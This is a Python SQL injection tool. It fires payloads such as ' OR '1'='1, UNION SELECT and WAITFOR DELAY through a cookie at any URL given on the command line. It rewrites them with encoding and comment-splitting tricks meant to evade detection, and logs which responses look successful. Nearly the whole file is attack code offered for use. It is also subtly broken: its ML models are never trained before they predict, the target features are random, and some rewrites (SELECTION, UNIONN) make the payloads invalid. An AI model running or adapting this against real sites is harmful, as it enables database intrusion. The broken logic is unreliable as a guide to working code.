import numpy as np
import pandas as pd
import requests
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.svm import SVC
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, roc_auc_score, confusion_matrix
from sklearn.model_selection import cross_val_score
import tensorflow as tf
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import concurrent.futures
import logging
import json
import time
import os
from datetime import datetime
import base64
import re
from typing import Dict, List, Tuple, Any

class MLComponent:
    def __init__(self):
        self.models = self._initialize_models()
        self.scaler = StandardScaler()
        self.logger = logging.getLogger('MLComponent')
        
    def _initialize_models(self) -> Dict:
        return {
            'random_forest': RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                min_samples_split=5,
                random_state=42
            ),
            'gradient_boost': GradientBoostingClassifier(
                n_estimators=100,
                learning_rate=0.1,
                max_depth=3,
                random_state=42
            )
        }
    
    def train_models(self, X: np.ndarray, y: np.ndarray) -> Dict:
        X_scaled = self.scaler.fit_transform(X)
        results = {}
        
        for name, model in self.models.items():
            self.logger.info(f"Training {name}")
            model.fit(X_scaled, y)
            cv_scores = cross_val_score(model, X_scaled, y, cv=5)
            results[name] = {
                'model': model,
                'cv_scores': cv_scores.mean()
            }
            
        return results

    def predict_vulnerability(self, features: np.ndarray) -> float:
        features_scaled = self.scaler.transform(features.reshape(1, -1))
        probas = []
        
        for model in self.models.values():
            proba = model.predict_proba(features_scaled)[0][1]
            probas.append(proba)
            
        return np.mean(probas)

class PayloadAnalyzer:
    def __init__(self):
        self.logger = logging.getLogger('PayloadAnalyzer')
        self.sql_keywords = [
            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 
            'DROP', 'EXEC', 'WAITFOR', 'DELAY', 'BENCHMARK'
        ]
        self.special_chars = ['\'', '"', ';', '--', '/*', '*/', '#', '=', ' OR ', ' AND ']
        
    def analyze_payload(self, payload: str) -> Dict:
        return {
            'complexity': self._calculate_complexity(payload),
            'risk_score': self._calculate_risk_score(payload),
            'evasion_score': self._calculate_evasion_score(payload),
            'pattern_analysis': self._analyze_patterns(payload)
        }
        
    def _calculate_complexity(self, payload: str) -> float:
        factors = {
            'length': len(payload) / 100,
            'keywords': sum(1 for k in self.sql_keywords if k in payload.upper()) / len(self.sql_keywords),
            'special_chars': sum(1 for c in self.special_chars if c in payload) / len(self.special_chars)
        }
        return np.mean(list(factors.values()))
        
    def _calculate_risk_score(self, payload: str) -> float:
        risk_factors = {
            'destructive_keywords': sum(1 for k in ['DROP', 'DELETE', 'TRUNCATE'] if k in payload.upper()),
            'multiple_queries': payload.count(';'),
            'comment_usage': payload.count('--') + payload.count('/*')
        }
        return min(sum(risk_factors.values()) / 5, 1.0)
        
    def _calculate_evasion_score(self, payload: str) -> float:
        evasion_techniques = {
            'encoding': self._check_encoding(payload),
            'case_variation': self._check_case_variation(payload),
            'comment_injection': self._check_comment_injection(payload)
        }
        return np.mean(list(evasion_techniques.values()))
        
    def _analyze_patterns(self, payload: str) -> Dict:
        return {
            'union_based': 'UNION' in payload.upper(),
            'error_based': "'" in payload or '"' in payload,
            'blind_based': 'WAITFOR' in payload.upper() or 'BENCHMARK' in payload.upper(),
            'stacked_queries': ';' in payload
        }

class EnhancedSQLITester:
    def __init__(self, target_url: str, cookie_name: str = "pid"):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.session = self._setup_session()
        self.ml_component = MLComponent()
        self.analyzer = PayloadAnalyzer()
        self.logger = self._setup_logger()
        self.results_dir = self._setup_results_directory()
        
    def _setup_session(self) -> requests.Session:
        session = requests.Session()
        retries = Retry(total=5, backoff_factor=0.1)
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))
        return session
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger('SQLITester')
        logger.setLevel(logging.INFO)
        handler = logging.FileHandler('sqli_testing.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger
        
    def _setup_results_directory(self) -> str:
        dirname = f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}'
        os.makedirs(dirname, exist_ok=True)
        return dirname

    def optimize_payload(self, base_payload: str, target_features: np.ndarray) -> str:
        """Optimize payload based on ML predictions and analysis"""
        vulnerability_score = self.ml_component.predict_vulnerability(target_features)
        analysis = self.analyzer.analyze_payload(base_payload)
        
        if vulnerability_score > 0.8:
            if analysis['risk_score'] > 0.7:
                return self._generate_evasive_payload(base_payload)
            else:
                return self._enhance_payload_effectiveness(base_payload)
        else:
            return self._generate_stealth_payload(base_payload)
            
    def _generate_evasive_payload(self, payload: str) -> str:
        """Generate payload with evasion techniques"""
        evasion_techniques = [
            self._encode_special_chars,
            self._add_timing_delays,
            self._use_alternate_syntax
        ]
        
        for technique in evasion_techniques:
            payload = technique(payload)
        return payload
        
    def _encode_special_chars(self, payload: str) -> str:
        """Encode special characters to avoid detection"""
        encodings = {
            "'": "CHAR(39)",
            '"': "CHAR(34)",
            " ": "CHAR(32)",
            "=": "LIKE",
            ";": "%3B"
        }
        
        for char, encoding in encodings.items():
            payload = payload.replace(char, encoding)
        return payload
        
    def _add_timing_delays(self, payload: str) -> str:
        """Add timing delays to evade detection"""
        if 'WAITFOR' not in payload.upper():
            payload = f"WAITFOR DELAY '0:0:0.1';" + payload
        return payload
        
    def _use_alternate_syntax(self, payload: str) -> str:
        """Use alternative SQL syntax"""
        replacements = {
            "OR": "||",
            "AND": "&&",
            "SELECT": "SELECTION",
            "UNION": "UNIONN",
        }
        
        for original, replacement in replacements.items():
            payload = payload.replace(original, replacement)
        return payload
        
    def _generate_stealth_payload(self, payload: str) -> str:
        """Generate stealthy version of payload"""
        stealth_techniques = [
            ('OR', '||'),
            ('AND', '&&'),
            ('SELECT', 'SEL/**/ECT'),
            ('UNION', 'UN/**/ION'),
            ('--', '/*--*/')
        ]
        
        for original, stealth in stealth_techniques:
            payload = payload.replace(original, stealth)
        return payload

    def execute_injection(self, payload: str) -> Dict:
        """Execute SQL injection with enhanced monitoring"""
        start_time = time.time()
        result = {
            'success': False,
            'response_time': 0,
            'error_detected': False,
            'response_length': 0
        }
        
        try:
            response = self.session.get(
                self.target_url,
                cookies={self.cookie_name: payload},
                timeout=30
            )
            
            result.update({
                'success': self._check_injection_success(response),
                'response_time': time.time() - start_time,
                'response_length': len(response.text),
                'status_code': response.status_code
            })
            
        except Exception as e:
            self.logger.error(f"Injection failed: {str(e)}")
            result['error'] = str(e)
            
        self._log_injection_result(payload, result)
        return result

    def _check_injection_success(self, response: requests.Response) -> bool:
        """Check if injection was successful"""
        success_indicators = [
            'sql error',
            'mysql error',
            'oracle error',
            'database error',
            'quoted string not properly terminated'
        ]
        
        return any(indicator in response.text.lower() for indicator in success_indicators)

    def _log_injection_result(self, payload: str, result: Dict):
        """Log injection results"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'payload': payload,
            'result': result,
            'analysis': self.analyzer.analyze_payload(payload)
        }
        
        log_file = os.path.join(self.results_dir, 'injection_log.json')
        with open(log_file, 'a') as f:
            json.dump(log_entry, f)
            f.write('\n')

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced SQL Injection Testing Framework')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--cookie', default='pid', help='Cookie name for injection')
    parser.add_argument('--output', default='results', help='Output directory')
    
    args = parser.parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Initialize tester
    tester = EnhancedSQLITester(args.url, args.cookie)
    
    # Example payloads for testing
    base_payloads = [
        "' OR '1'='1",
        "1' UNION SELECT NULL--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1--"
    ]
    
    # Run tests
    for base_payload in base_payloads:
        logging.info(f"Testing base payload: {base_payload}")
        
        # Generate target features (dummy example)
        target_features = np.random.rand(10)  # Replace with real feature extraction
        
        # Optimize and execute payload
        optimized_payload = tester.optimize_payload(base_payload, target_features)
        result = tester.execute_injection(optimized_payload)
        
        logging.info(f"Result: {json.dumps(result, indent=2)}")

if __name__ == "__main__":
    main()
